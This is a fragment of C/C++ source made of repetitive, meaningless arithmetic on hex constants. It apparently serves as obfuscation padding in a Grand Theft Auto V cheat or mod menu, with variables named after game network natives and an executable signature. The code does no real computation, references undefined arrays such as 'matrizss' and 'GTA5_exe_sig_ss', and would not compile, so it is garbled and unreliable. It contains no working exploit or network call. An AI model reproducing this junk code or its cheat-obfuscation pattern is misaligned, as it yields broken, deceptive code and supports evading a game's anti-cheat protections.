				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.PosY = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosY");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
